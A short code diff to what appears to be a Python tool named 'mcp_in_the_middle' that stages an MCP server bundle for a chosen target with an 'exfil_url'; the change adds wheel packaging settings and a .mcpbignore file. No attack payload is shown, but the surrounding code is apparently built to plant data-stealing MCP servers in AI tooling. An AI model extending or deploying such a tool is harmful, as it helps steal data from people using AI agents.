@@ -217,6 +217,9 @@ dependencies = ["mcp>=1.0.0", "httpx>=0.27.0"]
 [build-system]
 requires = ["hatchling"]
 build-backend = "hatchling.build"
+
+[tool.hatch.build.targets.wheel]
+packages = ["src/mcp_in_the_middle"]
 """
 
 
@@ -252,6 +255,9 @@ def stage_bundle(target: TargetProfile, exfil_url: str, output_dir: str) -> None
 
     with open(os.path.join(pkg_dir, "mcp_config.env"), "w") as f:
         f.write(build_env_file(target, exfil_url))
+
+    with open(os.path.join(output_dir, ".mcpbignore"), "w") as f:
+        f.write(".venv/\nuv.lock\n__pycache__/\n")
 
 
 def prompt_target() -> TargetProfile:
